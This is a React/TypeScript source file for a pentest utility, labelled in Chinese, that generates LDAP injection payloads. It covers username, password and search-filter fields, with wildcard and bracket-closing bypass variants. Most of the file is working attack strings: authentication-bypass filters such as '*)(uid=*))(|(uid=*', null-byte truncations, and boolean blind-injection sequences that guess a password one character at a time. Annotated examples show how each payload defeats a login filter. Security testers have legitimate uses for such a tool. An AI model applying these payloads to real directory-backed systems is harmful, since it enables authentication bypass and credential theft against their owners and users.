import SimpleTool from '../../_shared/SimpleTool';
import type { ToolProps } from '../../types';

const POINT_OPTIONS = [
  { value: 'username', label: '用户名' },
  { value: 'password', label: '密码' },
  { value: 'search-filter', label: '搜索过滤器' },
];

const BYPASS_OPTIONS = [
  { value: 'none', label: '无绕过' },
  { value: 'wildcard', label: '通配符' },
  { value: 'bracket', label: '括号闭合' },
];

const genUsername = (bypass: string): string[] => {
  const base = [
    '*',
    'admin',
    'admin)(&',
    'admin)(|',
    '*admin*',
    '*)(uid=*))(|(uid=*',
    '*)(uid=*))%00',
    'admin)(&)',
    ')(uid=*))(|(uid=*',
    '*))(|(uid=*',
  ];
  if (bypass === 'wildcard') {
    return [
      '*',
      'a*',
      '*admin*',
      'ad*',
      'adm*',
      'a*min',
      '*n',
      '%*',
      '?????',
      '*)(objectClass=*)',
    ];
  }
  if (bypass === 'bracket') {
    return [
      'admin)(&',
      'admin)(|',
      'admin)(&)',
      ')(uid=*))(|(uid=*',
      '*))(|(uid=*',
      'admin)(!(password=*)',
      'admin))(|(uid=*',
      '*))%00',
      'admin)(uid=*))(|(uid=*',
      'admin)(&(password=*))',
    ];
  }
  return base;
};

const genPassword = (bypass: string): string[] => {
  const base = [
    '*',
    'password',
    '*)(uid=*))(|(uid=*',
    '*))(|(password=*',
    '*)(password=*))(|(password=*',
    '*))%00',
    '',
    '*)(&',
    '*)(|',
    '*)(objectClass=*',
  ];
  if (bypass === 'wildcard') {
    return ['*', 'p*', '*pass*', 'pass*', '*word', 'p*w*d', '????????', '%*', '*)(password=*)'];
  }
  if (bypass === 'bracket') {
    return [
      '*)(uid=*))(|(uid=*',
      '*))(|(password=*',
      '*)(&',
      '*)(|',
      '*)(password=*))(|(password=*',
      '*))%00',
      ')(password=*))(|(password=*',
      '*)(uid=admin))(|(password=*',
    ];
  }
  return base;
};

const genFilter = (bypass: string): string[] => {
  const base = [
    '*',
    '(objectClass=*)',
    '(uid=*)',
    '(uid=admin)',
    '(uid=admin)(userPassword=*)',
    '(uid=*)(userPassword=*)',
    '(|(uid=admin)(uid=*))',
    '(&(uid=*)(objectClass=user))',
    '(uid=*admin*)',
    '(cn=*)',
  ];
  if (bypass === 'wildcard') {
    return ['*', '(uid=*)', '(uid=*admin*)', '(cn=*)', '(objectClass=*)', '(uid=a*)', '(uid=*n)', '(uid=*dmi*)'];
  }
  if (bypass === 'bracket') {
    return [
      '(uid=admin)(&',
      '(uid=admin)(|',
      '(uid=admin))',
      '(uid=*)(|',
      '(uid=*)(&',
      ')(uid=*))(|(uid=*',
      '(uid=admin))(|(uid=*',
      '(&(uid=admin)(userPassword=*))',
      '(uid=*))(|(uid=*',
    ];
  }
  return base;
};

const BLIND_PAYLOADS = [
  '--- 盲注 Payload（布尔型）---',
  '*',
  'a*',
  'ad*',
  'adm*',
  'admin*',
  'admin',
  'admin*',
  'admin)(password=*',
  'admin)(&(password=a*',
  'admin)(&(password=p*',
  'admin)(&(password=pa*',
  'admin)(&(password=pas*',
  'admin)(&(password=pass*',
  '',
  '说明: 通过观察响应差异判断字符是否匹配（二分法逐字符枚举）',
];

const generate = (point: string, bypass: string): string => {
  let payloads: string[];
  let label = '';
  switch (point) {
    case 'password':
      payloads = genPassword(bypass);
      label = '密码字段';
      break;
    case 'search-filter':
      payloads = genFilter(bypass);
      label = '搜索过滤器';
      break;
    default:
      payloads = genUsername(bypass);
      label = '用户名字段';
  }
  return [
    `=== LDAP注入 Payload（Point: ${label} / Bypass: ${bypass}）===`,
    '',
    '--- 基础注入 Payload ---',
    ...payloads.map((p, i) => `  [${i + 1}] ${p}`),
    '',
    '--- 注入示例 ---',
    '  原始: (uid=<输入>)',
    '  注入 *: (uid=*) → 匹配所有用户',
    '  注入 *)(uid=*))(|(uid=*: (uid=*)(uid=*))(|(uid=*) → 绕过认证',
    '  注入 admin)(&: (uid=admin)(&) → AND 短路',
    '  注入 admin)(|: (uid=admin)(|) → OR 短路',
    '',
    ...BLIND_PAYLOADS,
    '',
    '--- 常见过滤器语法 ---',
    '  &     AND',
    '  |     OR',
    '  !     NOT',
    '  =     相等',
    '  =*    存在',
    '  >=    大于等于',
    '  <=    小于等于',
    '  *(通配符) 任意字符',
    '  \\28 \\29  转义 ( )',
    '  \\2a     转义 *',
  ].join('\n');
};

const ToolComponent = (props: ToolProps) => (
  <SimpleTool
    {...props}
    toolName="LDAP注入Payload"
    paramsConfig={[
      { name: 'point', label: '注入点', type: 'select', options: POINT_OPTIONS, default: 'username' },
      { name: 'bypass', label: '绕过策略', type: 'select', options: BYPASS_OPTIONS, default: 'none' },
    ]}
    execute={(
      _input: string,
      _mode: string,
      params: Record<string, unknown>,
    ): string => generate(
      (params.point as string) ?? 'username',
      (params.bypass as string) ?? 'none',
    )}
  />
);

export default ToolComponent;
